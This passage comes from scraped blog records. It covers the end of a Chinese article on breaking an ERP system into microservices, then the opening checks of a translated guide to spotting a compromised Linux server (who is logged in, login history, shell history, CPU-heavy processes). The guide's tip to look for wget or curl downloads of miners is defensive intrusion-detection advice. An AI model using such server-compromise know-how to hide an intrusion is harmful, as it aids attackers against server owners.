拆分应用层</strong></p>\n<p>拆分应用层，是践行“微服务”架构的理念。将原来大而全的单进程架构按照业务模块拆分成可独立部署的应用程序，以此来达到平滑系统更新、升级、方便负载扩展的目的。具体来说，技术上可以使用restfull风格的接口，也可以使用像java中dubbo框架方式来简化开发复杂度。ERPWeb端或其他移动端也是一个单独的应用充当表现层。非常薄，只是简单的接受参数，调取后台其他各种微服务程序的接口获取所需展示的数据。微服务充当业务逻辑层，每个微服务都是可独立部署上线的程序，对外提供数据访问接口。</p>\n<p>微服务可以使用流行的各种RPC框架，比如dubbo，可以支持多种调用协议Http、TCP等，这些框架使得编码比较容易，框架封装底层数据通信细节，使得客户端执行远程方法如同执行本地方法一样简单。</p>\n<p>dubbo微服务架构，还支持服务治理，负载均衡等功能。这样不仅可以提高系统的可用性，还能动态提升系统应用层的性能。比如仓库管理中入库业务非常繁忙，占用非常多的CPU和内存资源，我们可以另外加一台机器，单独再部署一个仓库管理服务上去。这样使得整个系统，有两个仓库管理服务在同时工作，平衡负载。而这一切都是在服务注册中心，比如Zookeeper下自动完成的。</p>\n<p>微服务结构，天生很好的支持系统更新升级操作。比如财务模块有个新需求需要上线，我们只需要替换财务模块的服务重启即可。这对已经登录系统的用户来说，没有多少影响，不用重新登陆系统，其他模块服务使用也不受影响。</p>\n<p><strong>    拆分数据层</strong></p>\n<p>数据库瓶颈是ERP系统的永久之伤。大量复杂的数据查询表连接逻辑充斥着整个系统。数据库垂直拆分成功的关键就是如何重新设计系统数据层各个模块相互耦合的问题。能解决这个问题，永久之伤便可以解决了。</p>\n<p>我们先来看一个典型数据层模块耦合问题。需求是展示物料库存，列表字段：物料编号、物料名称、品类、仓库、数量</p>\n<p>物料表：</p>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>物料ID</td>\n<td>名称</td>\n<td>品类ID</td>\n</tr>\n<tr>\n<td>Z0001</td>\n<td>Iphone6红色手机壳</td>\n<td>Z</td>\n</tr>\n<tr>\n<td>Z0002</td>\n<td>iPhone6黑色手机壳</td>\n<td>Z</td>\n</tr>\n</tbody>\n</table>\n<p>库存表：</p>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>物料ID</td>\n<td>仓库ID</td>\n<td>数量</td>\n</tr>\n<tr>\n<td>Z0001</td>\n<td>W1</td>\n<td>10</td>\n</tr>\n<tr>\n<td>Z0002</td>\n<td>W1</td>\n<td>20</td>\n</tr>\n</tbody>\n</table>\n<p>品类和仓库表省略。。。</p>\n<p>很显然，传统一个数据库中，我们只需要简单的join操作，即可关联这两张表，外加关联品类和仓库表即可查询出我们所要的数据。但是现在我们的架构中，物料表和商品表不在同一个数据库实例中，我们不能使用join操作了，那我们该怎么实现需求呢？</p>\n<p>新的架构，只允许我们通过对方的服务接口来获取数据，不能直接关联对方服务的私有数据库。至少从架构上，服务化角度来说不能直接访问对方服务的数据库。这种情况下，假设web模块子系统调用仓库子系统来获取数据，则我们需要在仓库模块中创建一个service方法来装配这些数据。然后返回给web子系统。如下图所示，仓库管理方法首先获取本地库存表的物料编码、和仓库表的仓库名称字段信息，并且分页完后最终准备返回20条数据到Web模块前，将这20条数据中的物料ID作为参数请求商品模块子系统，商品子系统返回这20个物料ID相关的商品信息给到仓库管理模块，然后仓库管理模块重新组装上列表所需的物料名称和品类两个字段数据，实现最终要返回给Web子系统的数据。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/5844da7dc1a895e04903b2e7e9a80583.png\" alt=\"\" width=\"492\" height=\"484\"></p>\n<p>也许你会说，这太麻烦了，这种方法的性能肯定没有直接join来的高，解决不了性能问题。咋看起来好像是这么回事，但是仔细考虑看看，在系统并发量低、数据量小、业务不算繁忙的环境下，的确性能还不如传统一个数据中join方式来的快速。但我们想想以后吧！我们现在的架构设计是将一个数据库拆成多个数据库，每个数据库可以运行在单独的服务器上去，这样以后就能负载数据库的压力了。整体来说这样才能不会让数据库成为未来业务繁忙时候的性能瓶颈了。想想都觉得让人兴奋不已，是不是？</p>\n<p>这时候有人又会问，那以后系统数据量、业务更大了，连你这个拆分成几个数据库还不够用怎么办呢？我的方法是，可以基于拆分的数据库，单独每个库可以做读写分离、使用缓存等。甚至可以继续拆分下去，将子系统再次拆分成多个孙子系统。视业务模块繁忙程度而定。</p>\n<p><strong>报表系统</strong></p>\n<p>有人又会问，有些列表查询逻辑非常复杂，关联十多张表，如果按上述方法拆分数据，那简直是灾难啊！是的，你说的没有错。这种情况下我的方案是将这种更加复杂的报表级别的数据查询展示需求，可以单独做个报表系统。报表数据库设计采用数据仓库方式。为了更高的读取性能，我们可以将数据库表设计成很多冗余字段方式也就是反范式设计，以及建立非常多的组合索引。</p>\n<p>这种系统成功的关键就是数据和主ERP系统业务库的同步问题了。一般可以写一个定时同步程序，将ERP主业务系统的数据经过帅选、转化等方式直接生成报表视图所需的最终或中间数据，简化关联查询。报表系统也可以采用微服务架构设计。如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/522a3600daf64a8e983f09ed54353a98.png\" alt=\"\" width=\"651\" height=\"294\"></p>\n<p>如果报表所需的数据要求实时的，我们可以让ERP系统业务操作时，触发同步数据的请求，实时同步至报表库。</p>\n<p><strong>分布式事务</strong></p>\n<p>也许有人又又问了，ERP系统很多操作都要求事务性，你拆分系统后怎么实现事务性，保障数据一致性呢？</p>\n<p>这个问题很好，也是我决定写这篇文章前思考的最后一个问题。在微服务架构中，实现夸服务的事务并不容易，至少不像本地应用使用本地数据库事务那样方便，性能高效，数据一致性好。</p>\n<p>也许你听过分布式事务这个概念。有两种情景，一种是一个应用中使用多个数据库，为保障数据一致性，需要使用分布式事务。还有一种情况就是针对我们这个架构而言的。微服务环境下的分布式事务，具体来说打个比方。采购入库这个操作设计在仓库管理服务中。入库后，需要更新采购子系统中的采购单中的入库数量。这个过程要求数据一致性，也就是采购单入库成功后写入了库存表中的数量，同时要更新采购单表中的入库数量。我们不能直接在仓库服务中去访问采购服务中的数据库，必须通过采购服务提供的服务接口才行。如果这样，我们怎么能保证数据一致性呢？因为很有可能库存表写入成功，但调取采购服务写入采购单数据时失败了。可能是网络问题原因导致的，这样数据就不一致了。</p>\n<p>在分布式事务技术中，有实现最终一致性这么一说，意思就是只要我能保证两边数据最终实现了一致性就行，不一定要使用事务。这样说来就有方案了。如仓库子系统在处理采购入库时需要增加入库单数据和更新库存数据等多个表。这多个表都在仓库子系统中，我们可以使用一个本地事务来保证仓库子系统中的表数据一致性。然后调用采购子系统更新采购单里的入库数量。为了防止这个过程突然中断导致调用失败，我们考虑增加一个消息队列中间件如ActiveMQ。如果接口返回失败我们就往MQ里写入这个处理请求，等到采购子系统恢复正常后，MQ通知采购子系统处理这个更新操作。由于消息消费掉以后不会再有通知了，采购子系统处理过程中发生异常导致更新失败，需要将问题写入本地的日志库，以便通知管理员做后续补偿处理。就这样通过各种办法来达到数据的最终一致性即可。虽然听上去有点坑，但这就是解决方案。没有其他更好的了。或者更新失败后重新调用仓库子系统回滚入库单和库存数据，达到最终一致性！如图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/a5b2c925209ba4a005c3b909e598de99.png\" alt=\"\" width=\"651\" height=\"312\"></p>\n<p>非常有幸能和大家一起分享知识和经验，正是由于大家的无私分享，才让我们得以成长和进步，我最近几年来都很少分享东西，有时候是因为工作很忙没有时间写点东西，有时候也是因为自己懒或是没有什么新东西可以分享给大家的。最后也希望大家对我的分享不足之处给予批评指正，一起进步！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113174\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113174votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113174\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/900573f30c0b83190d0af33044be8518edaae066.jpg"}
{"url_object_id": "876ee85ca3eab93b154bc72080cb1d99", "title": "如何判断 Linux 服务器是否被入侵？", "url": "http://blog.jobbole.com/113205/", "create_date": "2017/12/06", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/05/1389f92e6bd3378cb6e4522971b7db35.jpg"], "praise_nums": 3, "comment_nums": 5, "favor_nums": 11, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://bash-prompt.net/guides/server-hacked/\">Elliot Cooper</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9116-1.html\">Linux中国/DarkSun</a>   </div><p>本指南中所谓的服务器被入侵或者说被黑了的意思，是指未经授权的人或程序为了自己的目的登录到服务器上去并使用其计算资源，通常会产生不好的影响。</p>\n<p>免责声明：若你的服务器被类似 NSA 这样的国家机关或者某个犯罪集团入侵，那么你并不会注意到有任何问题，这些技术也无法发觉他们的存在。</p>\n<p>然而，大多数被攻破的服务器都是被类似自动攻击程序这样的程序或者类似“脚本小子”这样的廉价攻击者，以及蠢蛋罪犯所入侵的。</p>\n<p>这类攻击者会在访问服务器的同时滥用服务器资源，并且不怎么会采取措施来隐藏他们正在做的事情。</p>\n<h3 id=\"toc_1\">被入侵服务器的症状</h3>\n<p>当服务器被没有经验攻击者或者自动攻击程序入侵了的话，他们往往会消耗 100% 的资源。他们可能消耗 CPU 资源来进行数字货币的采矿或者发送垃圾邮件，也可能消耗带宽来发动 DoS 攻击。</p>\n<p>因此出现问题的第一个表现就是服务器 “变慢了”。这可能表现在网站的页面打开的很慢，或者电子邮件要花很长时间才能发送出去。</p>\n<p>那么你应该查看那些东西呢?</p>\n<h4 id=\"toc_2\">检查 1 – 当前都有谁在登录?</h4>\n<p>你首先要查看当前都有谁登录在服务器上。发现攻击者登录到服务器上进行操作并不复杂。</p>\n<p>其对应的命令是 <code>w</code>。运行 <code>w</code> 会输出如下结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ac4b1523038871716\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n 08:32:55 up 98 days,  5:43,  2 users,  load average: 0.05, 0.03, 0.00\r\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\r\nroot     pts/0    113.174.161.1    08:26    0.00s  0.03s  0.02s ssh root@coopeaa12\r\nroot     pts/1    78.31.109.1      08:26    0.00s  0.01s  0.00s w\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b1523038871716-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b1523038871716-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b1523038871716-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b1523038871716-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b1523038871716-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ac4b1523038871716-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">32</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">55</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">98</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">days</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">users</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">load </span><span class=\"crayon-v\">average</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.05</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.03</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.00</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b1523038871716-2\"><span class=\"crayon-e\">USER     </span><span class=\"crayon-e\">TTY      </span><span class=\"crayon-e\">FROM             </span><span class=\"crayon-v\">LOGIN</span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">IDLE   </span><span class=\"crayon-e\">JCPU   </span><span class=\"crayon-e\">PCPU </span><span class=\"crayon-e\">WHAT</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac4b1523038871716-3\"><span class=\"crayon-e\">root     </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">113.174.161.1</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0.00s</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.03s</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.02s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ssh </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">coopeaa12</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b1523038871716-4\"><span class=\"crayon-e\">root     </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">78.31.109.1</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0.00s</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.01s</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.00s</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">w</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac4b1523038871716-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>第一个 IP 是英国 IP，而第二个 IP 是越南 IP。这个不是个好兆头。</p>\n<p>停下来做个深呼吸, 不要恐慌之下只是干掉他们的 SSH 连接。除非你能够防止他们再次进入服务器，否则他们会很快进来并踢掉你，以防你再次回去。</p>\n<p>请参阅本文最后的“被入侵之后怎么办”这一章节来看找到了被入侵的证据后应该怎么办。</p>\n<p><code>whois</code> 命令可以接一个 IP 地址然后告诉你该 IP 所注册的组织的所有信息，当然就包括所在国家的信息。</p>\n<h4 id=\"toc_3\">检查 2 – 谁曾经登录过?</h4>\n<p>Linux 服务器会记录下哪些用户，从哪个 IP，在什么时候登录的以及登录了多长时间这些信息。使用 <code>last</code> 命令可以查看这些信息。</p>\n<p>输出类似这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ac4b152d833789227\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot     pts/1        78.31.109.1      Thu Nov 30 08:26   still logged in\r\nroot     pts/0        113.174.161.1    Thu Nov 30 08:26   still logged in\r\nroot     pts/1        78.31.109.1      Thu Nov 30 08:24 - 08:26  (00:01)\r\nroot     pts/0        113.174.161.1    Wed Nov 29 12:34 - 12:52  (00:18)\r\nroot     pts/0        14.176.196.1     Mon Nov 27 13:32 - 13:53  (00:21)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b152d833789227-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b152d833789227-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b152d833789227-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b152d833789227-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac4b152d833789227-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac4b152d833789227-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ac4b152d833789227-1\"><span class=\"crayon-e\">root     </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">78.31.109.1</span><span class=\"crayon-h\">      </span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">Nov</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">still </span><span class=\"crayon-e\">logged </span><span class=\"crayon-st\">in</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b152d833789227-2\"><span class=\"crayon-e\">root     </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">113.174.161.1</span><span class=\"crayon-h\">    </span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">Nov</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">still </span><span class=\"crayon-e\">logged </span><span class=\"crayon-st\">in</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac4b152d833789227-3\"><span class=\"crayon-e\">root     </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">78.31.109.1</span><span class=\"crayon-h\">      </span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">Nov</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">24</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">01</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b152d833789227-4\"><span class=\"crayon-e\">root     </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">113.174.161.1</span><span class=\"crayon-h\">    </span><span class=\"crayon-e\">Wed </span><span class=\"crayon-i\">Nov</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">52</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">18</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac4b152d833789227-5\"><span class=\"crayon-e\">root     </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">14.176.196.1</span><span class=\"crayon-h\">     </span><span class=\"crayon-e\">Mon </span><span class=\"crayon-i\">Nov</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">27</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">32</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">53</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">21</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac4b152d833789227-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>这里可以看到英国 IP 和越南 IP 交替出现，而且最上面两个 IP 现在还处于登录状态。如果你看到任何未经授权的 IP，那么请参阅最后章节。</p>\n<p>登录后的历史记录会记录到二进制的 <code>/var/log/wtmp</code> 文件中（LCTT 译注：这里作者应该写错了，根据实际情况修改），因此很容易被删除。通常攻击者会直接把这个文件删掉，以掩盖他们的攻击行为。 因此, 若你运行了 <code>last</code> 命令却只看得见你的当前登录，那么这就是个不妙的信号。</p>\n<p>如果没有登录历史的话，请一定小心，继续留意入侵的其他线索。</p>\n<h4 id=\"toc_4\">检查 3 – 回顾命令历史</h4>\n<p>这个层次的攻击者通常不会注意掩盖命令的历史记录，因此运行 <code>history</code> 命令会显示出他们曾经做过的所有事情。 一定留意有没有用 <code>wget</code> 或 <code>curl</code> 命令来下载类似垃圾邮件机器人或者挖矿程序之类的非常规软件。</p>\n<p>命令历史存储在 <code>~/.bash_history</code> 文件中，因此有些攻击者会删除该文件以掩盖他们的所作所为。跟登录历史一样，若你运行 <code>history</code> 命令却没有输出任何东西那就表示历史文件被删掉了。这也是个不妙的信号，你需要很小心地检查一下服务器了。（LCTT 译注，如果没有命令历史，也有可能是你的配置错误。）</p>\n<h4 id=\"toc_5\">检查 4 – 哪些进程在消耗 CPU？</h4>\n<p>你常遇到的这类攻击者通常不怎么会去掩盖他们做的事情。他们会运行一些特别消耗 CPU 的进程。这就很容易发现这些进程了。只需要运行 <code>top</code> 然后看最前的那几个进程就行了。</p>\n<p>这也能显示出那些未登录进来的攻击者。比如，可能有人在用未受保护的邮件脚本来发送垃圾邮件。</p>\n<p>如果你最上面的进程对不了解，那么你可以 Google 一下进程名称，或者通过 <code>losf</code> 和 <code>strace</code> 来看看它做的事情是什么。</p>\n<p>使用这些工具，第一步从 <code>top</code> 中拷贝出进程的 PID，然后运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ac4b1533796808760\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" 